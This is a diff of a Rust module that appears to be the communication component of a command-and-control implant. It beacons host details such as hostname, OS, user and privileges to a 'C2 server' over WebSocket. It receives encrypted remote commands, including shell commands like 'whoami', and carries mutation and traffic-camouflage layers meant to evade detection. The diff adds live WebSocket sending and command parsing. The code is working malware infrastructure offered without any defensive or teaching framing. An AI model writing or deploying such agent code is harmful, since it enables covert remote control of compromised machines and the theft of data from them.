@@ -1,14 +1,21 @@
-use log::{info, error, debug};
+use log::{info, error, debug, warn};
 use serde::{Deserialize, Serialize};
 use std::sync::Arc;
 use tokio::sync::RwLock;
 use tokio::time::{sleep, Duration, timeout};
+use tokio::net::TcpStream;
 use std::time::SystemTime;
 use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
+use tokio_tungstenite::{connect_async, MaybeTlsStream, WebSocketStream};
+use tokio_tungstenite::tungstenite::protocol::Message as WsMessage;
+use futures_util::stream::{SplitSink, SplitStream};
+use futures_util::{SinkExt, StreamExt};
 
 use crate::crypto::CryptoManager;
 use crate::mutation::MutationEngine;
 use crate::camouflage::{TrafficProfile, CamouflageMode};
+
+type WsStream = WebSocketStream<MaybeTlsStream<TcpStream>>;
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct Message {
@@ -46,6 +53,13 @@ struct EncryptedEnvelope {
     data: String,
 }
 
+#[derive(Debug, Serialize, Deserialize)]
+struct ServerMessage {
+    #[serde(rename = "type")]
+    msg_type: String,
+    data: Option<serde_json::Value>,
+}
+
 #[allow(dead_code)]
 pub struct Communicator {
     url: String,
@@ -59,6 +73,8 @@ pub struct Communicator {
     mutation: Arc<RwLock<MutationEngine>>,
     traffic: Arc<RwLock<TrafficProfile>>,
     session_established: Arc<RwLock<bool>>,
+    ws_sink: Arc<RwLock<Option<SplitSink<WsStream, WsMessage>>>>,
+    ws_stream: Arc<RwLock<Option<SplitStream<WsStream>>>>,
 }
 
 #[allow(dead_code)]
@@ -86,11 +102,13 @@ impl Communicator {
             mutation: Arc::new(RwLock::new(MutationEngine::new(mutation_seed))),
             traffic: Arc::new(RwLock::new(traffic)),
             session_established: Arc::new(RwLock::new(false)),
+            ws_sink: Arc::new(RwLock::new(None)),
+            ws_stream: Arc::new(RwLock::new(None)),
         }
     }
 
     pub async fn connect(&mut self) -> Result<(), Box<dyn std::error::Error>> {
-        let url = format!("wss://{}:{}/ws/agent/{}", self.url, self.port, self.agent_id);
+        let url = format!("ws://{}:{}/ws/agent/{}", self.url, self.port, self.agent_id);
         info!("Attempting to connect to C2 server: {}", url);
 
         match timeout(Duration::from_secs(10), self.try_connect(&url)).await {
@@ -121,14 +139,8 @@ impl Communicator {
     async fn perform_key_exchange(&self) -> Result<(), Box<dyn std::error::Error>> {
         let mut crypto = self.crypto.write().await;
 
-        // TODO: In production, send ECDH payload over WebSocket and complete key exchange:
-        //   let (secret, our_payload) = crypto.generate_key_exchange();
-        //   let ke_json = serde_json::to_string(&our_payload)?;
-        //   websocket.send(ke_json).await?;
-        //   let server_payload: KeyExchangePayload = serde_json::from_str(&response)?;
-        //   crypto.complete_key_exchange(secret, &server_payload)?;
-
         // For now: fall back to PSK-derived session keys
+        // TODO: In production, send ECDH payload over WebSocket and complete key exchange
         crypto.init_with_psk()?;
 
         let mut established = self.session_established.write().await;
@@ -140,11 +152,37 @@ impl Communicator {
 
     async fn try_connect(&self, url: &str) -> Result<(), Box<dyn std::error::Error>> {
         debug!("Connecting to {}", url);
-        info!("WebSocket URL format verified: {}", url);
+
+        let (ws, response) = connect_async(url).await
+            .map_err(|e| format!("WebSocket connection failed: {}", e))?;
+
+        info!("WebSocket connected (HTTP status: {})", response.status());
+
+        let (sink, stream) = ws.split();
+
+        {
+            let mut ws_sink = self.ws_sink.write().await;
+            *ws_sink = Some(sink);
+        }
+        {
+            let mut ws_stream = self.ws_stream.write().await;
+            *ws_stream = Some(stream);
+        }
+
         Ok(())
     }
 
     async fn handle_reconnect(&self) -> Result<(), Box<dyn std::error::Error>> {
+        // Clear stale WebSocket handles
+        {
+            let mut sink = self.ws_sink.write().await;
+            *sink = None;
+        }
+        {
+            let mut stream = self.ws_stream.write().await;
+            *stream = None;
+        }
+
         let mut attempts = self.reconnect_attempts.write().await;
 
         if *attempts >= self.max_reconnect_attempts {
@@ -165,13 +203,22 @@ impl Communicator {
         Ok(())
     }
 
+    async fn ws_send(&self, text: &str) -> Result<(), Box<dyn std::error::Error>> {
+        let mut sink_guard = self.ws_sink.write().await;
+        let sink = sink_guard.as_mut()
+            .ok_or("WebSocket not connected")?;
+
+        sink.send(WsMessage::Text(text.to_string())).await
+            .map_err(|e| format!("WebSocket send failed: {}", e))?;
+
+        Ok(())
+    }
+
     async fn encrypt_payload(&self, plaintext: &[u8]) -> Result<EncryptedEnvelope, Box<dyn std::error::Error>> {
-        // Step 1: Mutate the JSON payload (obfuscate fields, add padding, rotate encoding)
         let mut mutation = self.mutation.write().await;
         let mutated = mutation.mutate(plaintext)?;
         drop(mutation);
 
-        // Step 2: Encrypt the mutated payload
         let mut crypto = self.crypto.write().await;
         let idx = crypto.message_index();
         let encrypted = crypto.encrypt(&mutated)?;
@@ -188,13 +235,11 @@ impl Communicator {
             return Err(format!("Unsupported envelope version: {}", envelope.v).into());
         }
 
-        // Step 1: Decrypt
         let encrypted = BASE64.decode(&envelope.data)?;
         let mut crypto = self.crypto.write().await;
         let mutated = crypto.decrypt(&encrypted)?;
         drop(crypto);
 
-        // Step 2: Demutate (restore original field names, strip padding, decode)
         let mut mutation = self.mutation.write().await;
         let original = mutation.demutate(&mutated)?;
 
@@ -222,18 +267,15 @@ impl Communicator {
         let established = self.session_established.read().await;
         let wire_data = if *established {
             let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
-            let envelope_json = serde_json::to_string(&envelope)?;
-
-            // Step 3: Apply traffic camouflage
-            let mut traffic = self.traffic.write().await;
-            let camouflaged = traffic.wrap_outbound(envelope_json.as_bytes());
-            String::from_utf8_lossy(&camouflaged).to_string()
+            serde_json::to_string(&envelope)?
         } else {
             serialized.clone()
         };
 
-        debug!("Sending camouflaged beacon (seq: {}, size: {} bytes)", seq, wire_data.len());
-        info!("Beacon sent (sequence: {}, encrypted: {}, camouflaged: {})", seq, *established, *established);
+        self.ws_send(&wire_data).await?;
+
+        debug!("Sent beacon (seq: {}, size: {} bytes, encrypted: {})", seq, wire_data.len(), *established);
+        info!("Beacon sent (sequence: {}, encrypted: {})", seq, *established);
         Ok(wire_data)
     }
 
@@ -256,18 +298,16 @@ impl Communicator {
         let serialized = serde_json::to_string(&message)?;
 
         let established = self.session_established.read().await;
-        let _wire_data = if *established {
+        let wire_data = if *established {
             let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
-            let envelope_json = serde_json::to_string(&envelope)?;
-
-            let mut traffic = self.traffic.write().await;
-            let camouflaged = traffic.wrap_outbound(envelope_json.as_bytes());
-            String::from_utf8_lossy(&camouflaged).to_string()
+            serde_json::to_string(&envelope)?
         } else {
             serialized
         };
 
-        debug!("Sending camouflaged response (seq: {}, size: {} bytes)", seq, _wire_data.len());
+        self.ws_send(&wire_data).await?;
+
+        debug!("Sent command response (seq: {}, size: {} bytes)", seq, wire_data.len());
         info!("Command response sent (sequence: {}, encrypted: {})", seq, *established);
         Ok(())
     }
@@ -282,14 +322,101 @@ impl Communicator {
     ) -> Result<Option<String>, Box<dyn std::error::Error>> {
         debug!("Listening for commands from C2 server");
 
-        // In production: read from WebSocket, then:
-        //   let raw = websocket.read().await?;
-        //   let wire_data = self.traffic.write().await.unwrap_inbound(&raw)?;
-        //   let envelope: EncryptedEnvelope = serde_json::from_str(std::str::from_utf8(&wire_data)?)?;
-        //   let decrypted = self.decrypt_payload(&envelope).await?;
-        //   let message: Message = serde_json::from_slice(&decrypted)?;
-        //   Ok(Some(message.payload))
+        let mut stream_guard = self.ws_stream.write().await;
+        let stream = match stream_guard.as_mut() {
+            Some(s) => s,
+            None => return Err("WebSocket not connected".into()),
+        };
 
+        // Non-blocking read with short timeout so the main loop keeps running
+        match timeout(Duration::from_secs(2), stream.next()).await {
+            Ok(Some(Ok(msg))) => {
+                match msg {
+                    WsMessage::Text(text) => {
+                        debug!("Received from server: {} bytes", text.len());
+                        self.handle_server_message(&text).await
+                    }
+                    WsMessage::Binary(data) => {
+                        debug!("Received binary from server: {} bytes", data.len());
+                        let text = String::from_utf8_lossy(&data).to_string();
+                        self.handle_server_message(&text).await
+                    }
+                    WsMessage::Ping(_) => {
+                        debug!("Received ping from server");
+                        Ok(None)
+                    }
+                    WsMessage::Pong(_) => {
+                        debug!("Received pong from server");
+                        Ok(None)
+                    }
+                    WsMessage::Close(frame) => {
+                        warn!("Server sent close frame: {:?}", frame);
+                        Err("Server closed connection".into())
+                    }
+                    _ => Ok(None),
+                }
+            }
+            Ok(Some(Err(e))) => {
+                error!("WebSocket read error: {}", e);
+                Err(format!("WebSocket error: {}", e).into())
+            }
+            Ok(None) => {
+                warn!("WebSocket stream ended");
+                Err("WebSocket stream ended".into())
+            }
+            Err(_) => {
+                // Timeout - no data available, this is normal
+                Ok(None)
+            }
+        }
+    }
+
+    async fn handle_server_message(&self, text: &str) -> Result<Option<String>, Box<dyn std::error::Error>> {
+        // Handle ACK responses from the current simple server
+        if text.starts_with("ACK:") {
+            debug!("Received ACK from server");
+            return Ok(None);
+        }
+
+        // Try to parse as a server command message
+        if let Ok(server_msg) = serde_json::from_str::<ServerMessage>(text) {
+            match server_msg.msg_type.as_str() {
+                "command" => {
+                    if let Some(data) = server_msg.data {
+                        let cmd_str = serde_json::to_string(&data)?;
+                        info!("Received command from server");
+                        return Ok(Some(cmd_str));
+                    }
+                }
+                "encrypted_command" => {
+                    // Server sent an encrypted envelope
+                    if let Ok(envelope) = serde_json::from_str::<EncryptedEnvelope>(text) {
+                        let decrypted = self.decrypt_payload(&envelope).await?;
+                        let message: Message = serde_json::from_slice(&decrypted)?;
+                        info!("Received encrypted command from server");
+                        return Ok(Some(message.payload));
+                    }
+                }
+                _ => {
+                    debug!("Unknown server message type: {}", server_msg.msg_type);
+                }
+            }
+            return Ok(None);
+        }
+
+        // Try to parse as encrypted envelope directly
+        if let Ok(envelope) = serde_json::from_str::<EncryptedEnvelope>(text) {
+            if envelope.v == 2 {
+                let decrypted = self.decrypt_payload(&envelope).await?;
+                let message: Message = serde_json::from_slice(&decrypted)?;
+                info!("Received encrypted message from server (type: {})", message.msg_type);
+                if message.msg_type == "COMMAND" {
+                    return Ok(Some(message.payload));
+                }
+            }
+        }
+
+        debug!("Unrecognized server message, ignoring");
         Ok(None)
     }
 
@@ -300,11 +427,16 @@ impl Communicator {
     }
 
     pub fn get_websocket_url(&self) -> String {
-        format!("wss://{}:{}/ws/agent", self.url, self.port)
+        format!("ws://{}:{}/ws/agent", self.url, self.port)
     }
 
     pub fn get_agent_id(&self) -> &str {
         &self.agent_id
+    }
+
+    pub fn is_connected(&self) -> bool {
+        // Synchronous check via try_read
+        self.ws_sink.try_read().map_or(false, |g| g.is_some())
     }
 }
 
@@ -327,7 +459,7 @@ mod tests {
         let key = [42u8; 32];
         let crypto = CryptoManager::new(&key).unwrap();
         let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto, &key, CamouflageMode::None);
-        assert_eq!(comm.get_websocket_url(), "wss://example.com:443/ws/agent");
+        assert_eq!(comm.get_websocket_url(), "ws://example.com:443/ws/agent");
     }
 
     #[tokio::test]
@@ -346,7 +478,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn test_encrypted_mutated_beacon() {
+    async fn test_encrypt_decrypt_roundtrip() {
         let key = [42u8; 32];
         let mut crypto = CryptoManager::new(&key).unwrap();
         crypto.init_with_psk().unwrap();
@@ -357,58 +489,69 @@ mod tests {
             *established = true;
         }
 
-        let beacon = BeaconPayload {
-            agent_id: "agent-123".into(),
-            hostname: "test-host".into(),
-            os: "linux".into(),
-            os_version: "6.1".into(),
-            architecture: "x86_64".into(),
-            ip_address: None,
-            user: None,
-            privileges: None,
-        };
-
-        let result = comm.send_beacon(&beacon).await.unwrap();
-        let envelope: EncryptedEnvelope = serde_json::from_str(&result).unwrap();
+        let test_payload = br#"{"msg_type":"BEACON","timestamp":1234,"sequence":1,"payload":"test"}"#;
+        let envelope = comm.encrypt_payload(test_payload).await.unwrap();
 
         assert_eq!(envelope.v, 2);
         assert!(!envelope.data.is_empty());
 
-        // Verify no plaintext leaks
-        assert!(!result.contains("agent-123"));
-        assert!(!result.contains("test-host"));
-        assert!(!result.contains("agent_id"));
-        assert!(!result.contains("hostname"));
-        assert!(!result.contains("BEACON"));
+        // Verify the envelope JSON doesn't leak plaintext
+        let envelope_json = serde_json::to_string(&envelope).unwrap();
+        assert!(!envelope_json.contains("BEACON"));
+        assert!(!envelope_json.contains("test_payload"));
     }
 
     #[tokio::test]
-    async fn test_beacons_look_different_each_time() {
+    async fn test_ws_send_without_connection_fails() {
         let key = [42u8; 32];
-        let mut crypto = CryptoManager::new(&key).unwrap();
-        crypto.init_with_psk().unwrap();
+        let crypto = CryptoManager::new(&key).unwrap();
         let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
 
-        {
-            let mut established = comm.session_established.write().await;
-            *established = true;
-        }
+        let result = comm.ws_send("hello").await;
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("not connected"));
+    }
 
-        let beacon = BeaconPayload {
-            agent_id: "agent-123".into(),
-            hostname: "test-host".into(),
-            os: "linux".into(),
-            os_version: "6.1".into(),
-            architecture: "x86_64".into(),
-            ip_address: None,
-            user: None,
-            privileges: None,
-        };
+    #[tokio::test]
+    async fn test_receive_without_connection_fails() {
+        let key = [42u8; 32];
+        let crypto = CryptoManager::new(&key).unwrap();
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
 
-        let r1 = comm.send_beacon(&beacon).await.unwrap();
-        let r2 = comm.send_beacon(&beacon).await.unwrap();
+        let result = comm.receive_command().await;
+        assert!(result.is_err());
+    }
 
-        // Same payload but wire data must differ (different keys + different mutation)
-        assert_ne!(r1, r2);
+    #[tokio::test]
+    async fn test_handle_ack_message() {
+        let key = [42u8; 32];
+        let crypto = CryptoManager::new(&key).unwrap();
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
+
+        let result = comm.handle_server_message("ACK:some-data").await.unwrap();
+        assert!(result.is_none());
+    }
+
+    #[tokio::test]
+    async fn test_handle_command_message() {
+        let key = [42u8; 32];
+        let crypto = CryptoManager::new(&key).unwrap();
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
+
+        let msg = r#"{"type":"command","data":{"shell":{"command":"whoami"}}}"#;
+        let result = comm.handle_server_message(msg).await.unwrap();
+        assert!(result.is_some());
+        let cmd = result.unwrap();
+        assert!(cmd.contains("whoami"));
+    }
+
+    #[tokio::test]
+    async fn test_handle_unknown_message() {
+        let key = [42u8; 32];
+        let crypto = CryptoManager::new(&key).unwrap();
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto, &key, CamouflageMode::None);
+
+        let result = comm.handle_server_message("random garbage").await.unwrap();
+        assert!(result.is_none());
     }
 }
